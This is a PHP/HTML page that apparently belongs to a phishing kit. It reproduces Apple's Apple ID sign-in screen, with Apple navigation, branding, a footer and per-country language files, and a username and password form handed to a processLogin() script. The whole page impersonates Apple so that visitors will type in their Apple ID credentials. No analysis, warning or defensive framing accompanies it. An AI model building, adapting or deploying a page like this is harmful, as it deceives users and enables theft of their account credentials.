<?php
if(INC != "true") {
  exit();
}
session_start();
require_once("inc/countries.php");
if(isset($_SESSION['country_code']) && isset($_SESSION['country_language'])) {
  require_once("language/".$_SESSION['country_language'].".php");
} else {
  $_SESSION['country_code'] = "usa";
  $_SESSION['country_language'] = "en";
  require_once("language/en.php");
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title><?php echo $title; ?></title>
    <link rel="stylesheet" href="assets/master.css" media="screen" title="no title" charset="utf-8">
    <link rel="icon" href="img/favicon.ico" />
    <script src="assets/master.js" charset="utf-8"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1">
  </head>
  <body>
    <div class="wrapper">
      <div class="navigation-bar">
        <div class="navigation-wrapper">
          <div class="logo" onclick="window.location='index.php'"></div>
          <ul id="menu_list">
            <li><a href="#" id="head_item1">Mac</a></li>
            <li><a href="#" id="head_item2">iPad</a></li>
            <li><a href="#" id="head_item3">iPhone</a></li>
            <li><a href="#" id="head_item4">Watch</a></li>
            <li><a href="#" id="head_item5">TV</a></li>
            <li><a href="#" id="head_item6">Music</a></li>
            <li><a href="#" id="head_item7"><?php echo $support; ?></a></li>
          </ul>
          <div class="search" id="search_icon"></div>
          <div class="shoppingbag" id="shoppingbag"></div>
          <div class="menuicon"></div>
          <input id="searchbox" class="searchbox hidden" placeholder="Search apple.com"/>
          <div class="cross hidden" id="krisskross"></div>
        </div>
        <div class="help-bar">
          <div class="help-wrapper">
            <h1>Apple ID</h1>
            <div class="right">
              <div class="desactive"><?php echo $sign_in; ?></div>
              <div class="link"><a class="nonmenu" href=""><?php echo $sign_up; ?></a></div>
              <div class="link"><a class="nonmenu" href=""><?php echo $faq; ?></a></div>
            </div>
          </div>
        </div>
      </div>
      <div class="body-bg">
        <div class="loaders" id="loaders"></div>
        <div class="login_form">
          <div class="nopacity" id="main_form">
            <div class="appleid"></div>
            <h1><?php echo $subheader; ?></h1>
            <div class="form">
              <input type="hidden" value="<?php echo htmlentities($_GET['web_session']); ?>" id="session" />
              <input type="text" id="username" placeholder="<?php echo $appleid; ?>" autocomplete="off" />
              <input type="password" id="password" placeholder="<?php echo $applepassword; ?>" autocomplete="off" />
              <div class="arrow" id="arrow" onclick="processLogin()"></div>
              <div class="remember">
                <div class="checkbox" id="master_check" style="<?php echo $applestyle; ?>"></div>
                <h1 id="m_check"><?php echo $remember_me; ?></h1>
              </div>
            </div>
          </div>
          <h3><a class="nonmenu" href=""><?php echo $forgot_password; ?></a></h3>
        </div>
      </div>
    </div>
    <div class="body">
      <h1><?php echo $apple_head; ?></h1>
      <h2><?php echo $apple_subhead; ?></h2>
      <div class="apple_sprite"></div>
      <div class="create">
        <a><?php echo $sign_up; ?> <div class="rarrow"></div></a>
      </div>
    </div>
    <div class="footer">
      <div class="wrapper">
        <div class="main">
          <h1><?php echo $apple_footer; ?></h1>
          <h2><?php echo $apple_copyrights; ?></h2>
          <ul class="unresp">
            <li><a class="nonmenu" href=""><?php echo $apple_footerlist_1; ?></a></li>
            <div class="stick"></div>
            <li><a class="nonmenu" href=""><?php echo $apple_footerlist_2; ?></a></li>
            <div class="stick"></div>
            <li><a class="nonmenu" href=""><?php echo $apple_footerlist_3; ?></a></li>
            <div class="stick"></div>
            <li><a class="nonmenu" href=""><?php echo $apple_footerlist_4; ?></a></li>
            <div class="stick"></div>
            <li><a class="nonmenu" href=""><?php echo $apple_footerlist_5; ?></a></li>
            <li class="country"><div class="mini_flag <?php echo $code_class[$_SESSION['country_code']]; ?>"></div><a class="nonmenu" href="language.php"><?php echo $code_country[$_SESSION['country_code']]; ?></a></li>
          </ul>
          <ul class="resp">
            <li class="country"><div class="mini_flag <?php echo $code_class[$_SESSION['country_code']]; ?>"></div><a class="nonmenu" href="language.php"><?php echo $code_country[$_SESSION['country_code']]; ?></a></li>
          </ul>
        </div>
      </div>
    </div>
  </body>
</html>
